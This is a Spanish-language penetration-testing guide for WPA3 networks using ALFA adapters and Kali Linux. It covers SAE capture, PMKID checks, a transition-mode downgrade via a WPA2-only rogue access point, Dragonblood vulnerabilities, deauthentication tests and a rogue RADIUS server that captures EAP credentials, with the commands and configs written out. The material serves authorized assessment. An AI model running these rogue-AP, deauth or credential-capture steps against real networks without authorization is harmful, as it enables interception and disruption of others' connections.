---
title: "Pruebas de Seguridad WPA3 con Adaptadores ALFA (2026)"
description: "Guía completa para pruebas de seguridad WPA3 usando adaptadores ALFA Network. Cubre análisis del handshake SAE, vulnerabilidades Dragonblood, ataques de degradación en modo de transición, cumplimiento de PMF y pruebas EAP de WPA3-Enterprise."
date: 2026-03-24
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
---

{{< alert "triangle-exclamation" >}}
**Aviso Legal:** Todas las pruebas de seguridad inalámbrica deben realizarse únicamente en redes y dispositivos para los cuales se tenga autorización explícita y por escrito. Las técnicas de prueba WPA3, incluyendo la captura SAE, la desautenticación y el despliegue de AP fraudulentos, están sujetas a los mismos requisitos legales que cualquier otra actividad de evaluación inalámbrica. Solo pruebas autorizadas.
{{< /alert >}}

WPA3 representa una mejora significativa sobre WPA2 tanto en seguridad inalámbrica personal como empresarial. La Autenticación Simultánea de Iguales (SAE) reemplaza el handshake de Clave Pre-Compartida (PSK) con un intercambio de claves autenticado por contraseña que es resistente a ataques de diccionario fuera de línea. Los Marcos de Gestión Protegidos (PMF) son obligatorios. El secreto hacia adelante está incorporado.

Sin embargo, WPA3 no está exento de vulnerabilidades. La investigación Dragonblood (2019) descubrió vulnerabilidades de canal lateral y de denegación de servicio en el handshake SAE. El modo de transición introduce superficies de ataque por degradación. Los despliegues empresariales enfrentan las mismas debilidades de validación de certificados 802.1X que WPA2-Enterprise. Esta guía cubre la metodología completa de pruebas de seguridad WPA3 usando adaptadores ALFA Network, los cuales proporcionan la estabilidad del modo monitor y la capacidad de inyección requeridas para una evaluación exhaustiva.

---

## Fundamentos de WPA3 para Testers de Seguridad

### SAE: Autenticación Simultánea de Iguales

SAE reemplaza el handshake de cuatro vías de WPA2-PSK con un intercambio de prueba de conocimiento cero basado en el protocolo de intercambio de claves Dragonfly. La propiedad clave que importa para las pruebas de seguridad es el **secreto hacia adelante**: incluso si la contraseña Wi-Fi se compromete posteriormente, el tráfico capturado anteriormente no puede descifrarse. Esto elimina el valor principal del descifrado de contraseñas fuera de línea contra una red solo SAE.

SAE también elimina la vulnerabilidad a los ataques PMKID que afectaban a WPA2. No existe un artefacto equivalente crackeable fuera de línea que un atacante pasivo pueda extraer de una asociación SAE.

### PMF: Obligatorio en WPA3

Los Marcos de Gestión Protegidos 802.11w son obligatorios en WPA3. Los marcos de desautenticación y desasociación están protegidos criptográficamente, lo que impide los ataques de deauth falsificados que son trivialmente efectivos contra redes WPA2 sin PMF. Una red solo WPA3 debería ser inmune a la aceleración de captura de handshake basada en desautenticación.

### Modo de Transición WPA3

El escenario de despliegue más común en el mundo real es el **Modo de Transición WPA3**: el AP acepta autenticación tanto WPA3-SAE como WPA2-PSK simultáneamente para mantener la compatibilidad con dispositivos que no soportan WPA3. Este modo es la principal superficie de ataque en los entornos empresariales actuales — reintroduce la exposición del handshake PSK de WPA2 en una red que anuncia WPA3.

### WPA3-Enterprise

WPA3-Enterprise exige un modo de seguridad de 192 bits usando GCMP-256 y HMAC-SHA-384, con autenticación mutua basada en certificados. Aborda las mismas vulnerabilidades de validación de certificados que WPA2-Enterprise si no se despliega correctamente. La metodología de prueba para la capa 802.1X se cubre en el [framework de evaluación de seguridad inalámbrica empresarial](/es/blog/enterprise-wireless-security-assessment/).

---

## Entorno de Pruebas y Requisitos de Adaptador

### Selección de Adaptador

Las pruebas WPA3 requieren un adaptador con modo monitor confiable, soporte de inyección y — para redes WPA3 de 6 GHz — capacidad tri-banda:

- **AWUS036AXML** — Requerido para redes WPA3 Wi-Fi 6E (6 GHz). Chipset Mediatek MT7921AUN. Soporte completo de modo monitor e inyección en Kali Linux con kernel 5.18+.
- **AWUS036ACH** — Adecuado para pruebas WPA3 en 2.4/5 GHz. Chipset RTL8812AU. Máxima compatibilidad con la cadena de herramientas aircrack-ng y mayor soporte de drivers en todas las versiones de Kali Linux.

### Habilitar el Modo Monitor

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor interface
iwconfig wlan0mon
```

Para una guía completa de configuración del modo monitor, consulta [Habilitar Modo Monitor en Kali Linux](/es/blog/enable-monitor-mode-kali-linux/).

### Identificar Redes WPA3 en los Resultados del Escaneo

```bash
# Passive scan across all bands
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# Filter for WPA3 networks in results
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

En la salida de airodump-ng, las redes WPA3-SAE aparecen con `WPA3 SAE` en la columna AUTH. Las redes en modo de transición muestran `WPA2 WPA3 SAE PSK`. Las redes con cifrado mejorado abierto (OWE) muestran `OWE`.

---

## Fase 1: Captura y Análisis del Handshake SAE

### Limitaciones de la Captura Pasiva

A diferencia de WPA2, **los handshakes SAE no pueden usarse para ataques de diccionario fuera de línea**. Capturar los marcos commit y confirm de SAE es sencillo con cualquier adaptador en modo monitor, pero el material capturado no produce un hash crackeable. El propósito de capturar marcos SAE es el análisis a nivel de protocolo — verificar que la variante SAE correcta está en uso, confirmar que PMF está negociado y proporcionar evidencia en el informe de evaluación.

```bash
# Capture on the target AP channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# Analyze the capture in Wireshark
# Filter: wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
# (0x000b = Authentication frame)
wireshark -r sae_capture-01.cap
```

En los marcos de Autenticación, verifica el intercambio commit y confirm de SAE. El Elemento de Información RSN en los marcos Beacon debe mostrar:
- **Suite AKM**: 00-0F-AC:8 (SAE) para WPA3-Personal
- **PMF**: Requerido (bit MFPR activado en las Capacidades RSN)

### Prueba de PMKID en Redes SAE

```bash
# Attempt PMKID capture — SAE networks should yield no crackable PMKID
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

# Convert and inspect
hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng

# An empty or absent hash file confirms no WPA2 PMKID exposure
wc -l wpa3_hashes.hc22000
```

Si `hcxpcapngtool` produce un archivo `.hc22000` con contenido para una red anunciada como solo WPA3, esto indica que el AP está operando en modo de transición y exponiendo un PMKID de WPA2 — un hallazgo significativo.

---

## Fase 2: Prueba de Ataque de Degradación en Modo de Transición

### La Superficie de Ataque de Degradación

El Modo de Transición WPA3 es la vulnerabilidad WPA3 de mayor impacto en los entornos empresariales actuales. Cuando un AP opera en modo de transición, acepta asociaciones tanto SAE como PSK. Un atacante que puede observar las solicitudes de sondeo de los clientes puede crear un AP fraudulento que presenta solo capacidades WPA2-PSK para el mismo SSID — si el cliente se conecta sin requerir SAE, se captura un handshake estándar de 4 vías de WPA2 que puede atacarse fuera de línea.

### Procedimiento de Prueba

```bash
# Step 1: Confirm the target is in transition mode (shows WPA2+WPA3 in airodump-ng)
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# Step 2: Capture the legitimate AP's beacon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# Step 3: Create a WPA2-only rogue AP
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# Step 4: Monitor for client associations on the rogue AP
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

**Hallazgo crítico:** Si un cliente que anteriormente se conectó vía SAE se asocia al AP fraudulento solo WPA2, el sistema operativo del cliente no está aplicando el requisito WPA3-SAE. Esto representa un ataque de degradación exitoso.

**Condición de aprobación:** El cliente ignora el AP solo WPA2 o muestra una alerta, y no completa un handshake WPA2.

### Indicador de Degradación en la Salida de hcxpcapngtool

```bash
# Convert rogue AP capture — presence of hash confirms WPA2 association occurred
hcxpcapngtool -o downgrade_hash.hc22000 downgrade_capture-01.cap
cat downgrade_hash.hc22000
# Non-empty output = downgrade attack succeeded
```

---

## Fase 3: Evaluación de Vulnerabilidades Dragonblood

### Antecedentes

La investigación Dragonblood (Vanhoef & Ronen, 2019) identificó múltiples vulnerabilidades en la implementación del handshake SAE:

- **CVE-2019-9494 / CVE-2019-9496**: Ataques de canal lateral contra el marco commit de SAE, que permiten ataques de diccionario fuera de línea contra implementaciones sin parches
- **CVE-2019-9499**: Omisión de confirmación SAE que lleva a la degradación de WPA3-Personal a WPA2-PSK
- **DoS mediante inundación de commit SAE**: Agotamiento de las tablas de estado del AP enviando grandes cantidades de marcos commit SAE

### Prueba de Token Anti-Clogging SAE

```bash
# Install hcxtools
sudo apt install hcxtools

# Use hcxdumptool to observe SAE commit/confirm frame exchange rate limiting
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3

# In Wireshark, filter for Authentication frames:
# wlan.fc.type_subtype == 0x000b
wireshark -r dragonblood_test.pcapng
```

### Verificación de la Versión del Firmware del AP

Compara la versión del firmware del AP descubierto con los avisos de seguridad del proveedor:
- Cisco: Security Advisory cisco-sa-wpa3-sae-side-channel (2019)
- Aruba: ArubaOS 8.6+ incluye parches para Dragonblood
- Ubiquiti: UniFi Network 6.0+ incluye parches para Dragonblood
- MikroTik: RouterOS 6.45.7+ incluye parches para Dragonblood

---

## Fase 4: Prueba de Cumplimiento de PMF en Redes WPA3

### Prueba de Desautenticación

```bash
# Attempt deauth against a test client associated via WPA3-SAE
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
```

### PMF Capable vs. Required

```bash
# Capture beacon frames and decode RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

Interpretación de la salida:
- `1,1` — PMF Requerido: Correcto para WPA3
- `1,0` — PMF Capable pero no Requerido: Hallazgo medio
- `0,0` — PMF Deshabilitado: Hallazgo alto

---

## Fase 5: Pruebas OWE (Cifrado Inalámbrico Oportunista)

OWE (Wi-Fi Enhanced Open) es el reemplazo WPA3 para redes de invitados completamente abiertas. OWE realiza un intercambio de claves Diffie-Hellman no autenticado para establecer cifrado por sesión sin requerir contraseña.

```bash
# Scan for hidden SSIDs paired with OWE networks
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"
```

---

## Fase 6: Evaluación de WPA3-Enterprise

### Verificación del Modo de Seguridad de 192 Bits

```bash
# Capture and decode RSN IE for enterprise SSID
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

### Prueba de RADIUS Fraudulento

```bash
sudo apt install hostapd-wpe
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Para el procedimiento completo de pruebas EAP/RADIUS, consulta el [framework de evaluación de seguridad inalámbrica empresarial](/es/blog/enterprise-wireless-security-assessment/).

---

## Referencia de Herramientas para Pruebas WPA3

| Herramienta | Propósito | Adaptador | Comando Clave |
|---|---|---|---|
| airodump-ng | Descubrimiento de redes WPA3, captura de marcos SAE | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | Captura PMKID/SAE, detección de modo de transición | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | Conversión de capturas, detección de exposición WPA2 | N/A (post-procesamiento) | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | Análisis de RSN IE, capacidad PMF | Cualquiera (vía archivo de captura) | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | Prueba de cumplimiento PMF (deauth) | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | AP fraudulento solo WPA2 para pruebas de degradación | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | RADIUS fraudulento para pruebas EAP de WPA3-Enterprise | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

---

## Resumen de Hallazgos para Evaluaciones WPA3

| ID | Severidad | Hallazgo | Condición |
|---|---|---|---|
| W3-01 | Crítica | Degradación WPA3 a WPA2 exitosa; handshake capturado y crackeable | Cliente asociado a AP fraudulento solo WPA2; hash recuperado |
| W3-02 | Alta | Modo de transición sin cumplimiento SAE; PMKID WPA2 expuesto | hcxpcapngtool devuelve hash crackeable de red WPA3 |
| W3-03 | Alta | PMF no aplicado en SSID WPA3; ataque deauth exitoso | Cliente de prueba desconectado por deauth de aireplay-ng |
| W3-04 | Alta | Clientes WPA3-Enterprise aceptan RADIUS fraudulento sin advertencia de certificado | hostapd-wpe captura credenciales EAP del cliente de prueba |
| W3-05 | Media | PMF Capable pero no Requerido en SSID WPA3 | RSN IE muestra MFPC=1, MFPR=0 |
| W3-06 | Media | WPA3-Enterprise no usa modo de seguridad de 192 bits | RSN IE muestra CCMP-128 en lugar de GCMP-256 |
| W3-07 | Media | Firmware del AP anterior a los parches de Dragonblood | Comparación de versión de firmware con avisos del proveedor |
| W3-08 | Baja | Modo de transición OWE; clientes heredados se conectan sin cifrado | SSID abierto visible junto al SSID OWE |

---

## Recursos Relacionados

- [Evaluación de Seguridad Inalámbrica Empresarial: Un Framework Completo](/es/blog/enterprise-wireless-security-assessment/)
- [Guía de Inyección de Paquetes: Prueba Tu Adaptador WiFi con aireplay-ng](/es/blog/packet-injection-guide/)
- [Habilitar Modo Monitor en Kali Linux](/es/blog/enable-monitor-mode-kali-linux/)
